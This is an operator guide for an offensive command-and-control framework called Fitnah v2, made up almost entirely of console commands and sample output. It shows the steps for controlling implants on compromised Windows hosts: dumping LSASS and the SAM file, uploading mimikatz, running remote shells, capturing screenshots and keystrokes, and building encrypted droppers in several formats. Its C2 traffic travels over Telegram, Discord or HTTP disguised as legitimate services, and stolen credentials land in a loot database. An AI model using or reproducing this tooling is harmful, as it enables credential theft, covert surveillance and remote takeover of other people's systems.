# Operator Guide — Fitnah v2

This guide walks through every operator action from launching the framework to extracting loot. All commands are typed into the interactive REPL that appears when you run `python main.py`.

---

## Launching the Framework

```bash
# Basic launch — auto-creates a project named op_YYYYMMDD
python main.py

# Named project + operator tag for the audit log
python main.py --project operation_nightfall --operator alice

# Override HTTP listener port
python main.py --http-port 9000

# Apply a malleable C2 profile (changes HTTP beacon URI/headers)
python main.py --profile jquery

# Disable the HTTP listener entirely
python main.py --no-http
```

The console prompt shows your current context:
```
op_nightfall >                          # root — no session selected
op_nightfall • agent-abc123 >           # session selected
op_nightfall • agent-abc123 • dump_sam> # module loaded
```

---

## Session Management

An **agent** (implant) checks in automatically when it runs on the target. The beacon sends a CHECKIN message containing hostname, IP, OS, username, and privilege level.

### List all agents
```
op_nightfall > sessions
op_nightfall > agents       # richer table: shows last_seen time
```

### Select a session (interact with an agent)
```
op_nightfall > sessions -i agent-abc123
op_nightfall > use agent-abc123          # shortcut
```
Once selected, all module `run` commands go to that agent.

### Kill a session
```
op_nightfall > sessions -k agent-abc123
```
Sends a `die` command to the implant and removes it from the session list.

---

## Module Workflow (Metasploit-style)

The core workflow mirrors Metasploit: **use** a plugin, **set** its options, **run** it.

### Step 1 — Find a plugin
```
op_nightfall > search lsass
op_nightfall > search T1003
op_nightfall > plugins credential_access
op_nightfall > plugins                   # list all 74 plugins
```

### Step 2 — Load the plugin
```
op_nightfall > use lsass_dump
op_nightfall • agent-abc123 • lsass_dump>
```

### Step 3 — Review and set options
```
op_nightfall • agent-abc123 • lsass_dump> options

  Module: lsass_dump

  NAME                 VALUE                REQUIRED   DESCRIPTION
  ──────────────────── ──────────────────── ─────────  ──────────────────────────
  method               comsvcs              no         Dump method: comsvcs/procdump/direct
  output_path          C:\Windows\Temp\...  no         Path to write the dump file

op_nightfall • agent-abc123 • lsass_dump> set method direct
  [+] method => direct
```

### Step 4 — Run
```
op_nightfall • agent-abc123 • lsass_dump> run
  [*] Running lsass_dump against WORKSTATION01...
  [+] Status : ok
      method               : direct
      dump_path            : C:\Windows\Temp\debug.dmp
      size_mb              : 42
  [+] Saved to loot #7
```

### Step 5 — View loot
```
op_nightfall > loot
op_nightfall > loot -t credential
op_nightfall > loot -d 7            # dump raw bytes of entry #7
op_nightfall > loot --export csv --out creds.csv
```

### Run against a different agent without re-selecting
```
op_nightfall > run -s agent-xyz999
```

### Exit a module / deselect agent
```
op_nightfall > back     # exits module, keeps agent selected
op_nightfall > back     # now deselects agent
```

---

## Direct Shell Commands

You do not need to load a module for simple commands:

```
op_nightfall > shell whoami /all
op_nightfall > shell net user /domain
op_nightfall > shell ipconfig /all
```

`shell` dispatches a raw `cmd /c` via the C2. Output is printed directly.

---

## File Transfer

### Download a file from the agent
```
op_nightfall > download agent-abc123 C:\Windows\System32\SAM
# File is saved to: downloads/20260618_142301_SAM
```

### Upload a file to the agent
```
op_nightfall > upload agent-abc123 ./mimikatz.exe C:\Windows\Temp\m.exe
```

The file is base64-encoded on the operator side and decoded by the implant.

### Screenshot
```
op_nightfall > screenshot                 # uses active session
op_nightfall > screenshot agent-abc123    # explicit agent
# Saved to: screenshots/20260618_142305_WORKSTATION01.png
```

---

## Builder — Generating Payloads

The builder creates implant droppers baked with a specific agent ID, bot token, and chat ID.

```
op_nightfall > builder -f ps1 -a agent-abc123
op_nightfall > builder -f exe -a agent-abc123 --arch x64
op_nightfall > builder -f vba -a agent-abc123
op_nightfall > builder -f hta -a agent-abc123
op_nightfall > builder -f shellcode -a agent-abc123
```

**All builder options:**
| Flag | Default | Description |
|---|---|---|
| `-f <fmt>` | ps1 | Output format: `exe` `dll` `shellcode` `ps1` `vba` `hta` |
| `-a <id>` | active session | Agent ID to bake in |
| `--arch x64\|x86` | x64 | CPU architecture |
| `--sleep N` | 5 | Beacon interval in seconds |
| `--jitter N` | 20 | Jitter percentage |
| `--encrypt <algo>` | auto | `none` `xor` `aes-256-gcm` |
| `--out <name>` | auto | Output filename |
| `--list` | — | List files in build directory |

Default encryption: `aes-256-gcm` for exe/dll/shellcode, `none` for scripts.

---

## Scheduler — Recurring Tasks

Run any plugin automatically on a timer:

```
op_nightfall > schedule sysinfo 300 agent-abc123    # sysinfo every 5 min
op_nightfall > schedules                            # list active schedules
op_nightfall > unschedule <schedule_id>             # cancel
```

Useful for: periodic `sysinfo` check-ins, recurring `screenshot` capture, automated `keylogger` dumps.

---

## Transport Management

```
op_nightfall > listeners                # show Telegram + Discord + HTTP status
op_nightfall > listeners failover       # force switch to Discord
op_nightfall > listeners recover        # switch back to Telegram
```

### C2 Profiles (malleable HTTP beaconing)
```
op_nightfall > profile list             # available profiles
op_nightfall > profile set jquery       # hot-swap — no restart needed
op_nightfall > profile info jquery      # show URI, headers, user-agent
```

Available profiles: `jquery`, `office365`, `windows_update`, `google_fonts`

---

## Loot Database

All plugin output that produces data is saved to a SQLite loot database.

```
op_nightfall > loot                          # recent entries (table view)
op_nightfall > loot -q password              # search labels
op_nightfall > loot -t credential            # filter by type
op_nightfall > loot -a agent-abc123          # filter by agent
op_nightfall > loot -d 7                     # dump raw bytes of entry #7
op_nightfall > loot -x 7                     # delete entry #7
op_nightfall > loot --export text            # print formatted table
op_nightfall > loot --export csv             # print CSV
op_nightfall > loot --export bh              # BloodHound JSON (credentials)
op_nightfall > loot --export csv --out c.csv # write to file
```

Loot types: `credential`, `file`, `screenshot`, `scan`, `sysinfo`, `keylog`, `generic`

---

## Plugin Management

```
op_nightfall > plugins                   # list all 74 plugins
op_nightfall > plugins recon             # filter by category
op_nightfall > search kerberos           # search by name/MITRE/description
op_nightfall > info kerberoasting        # full plugin detail
op_nightfall > reload                    # hot-reload all plugins (no restart)
op_nightfall > install ./my_plugin.py    # install from file
op_nightfall > uninstall my_plugin       # remove
```

---

## Audit and History

Every operator action is written to an append-only JSONL audit log with HMAC integrity verification:

```
op_nightfall > audit 20              # show last 20 entries
op_nightfall > audit-verify          # verify HMAC integrity of entire log
op_nightfall > history agent-abc123  # show touch log for a specific agent
```

---

## Project Management

Projects are FuzzBunch-style workspaces that persist session history, audit logs, and configuration:

```
op_nightfall > project info     # current project details
op_nightfall > project list     # all saved projects
```

On launch: `python main.py --project operation_nightfall` loads an existing project or creates a new one.

---

## Status and Exit

```
op_nightfall > status    # server + transport status summary
op_nightfall > exit      # graceful shutdown
op_nightfall > quit      # same as exit
```
